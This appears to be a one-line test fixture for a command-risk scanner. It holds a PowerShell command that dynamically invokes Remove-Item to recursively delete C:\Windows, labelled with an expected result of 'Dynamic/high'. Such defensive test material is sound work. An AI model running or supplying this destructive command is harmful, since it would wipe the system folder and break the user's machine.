# expect: Dynamic/high
Get-Command Remove-Item | ForEach-Object { & $_ C:\Windows -Recurse }
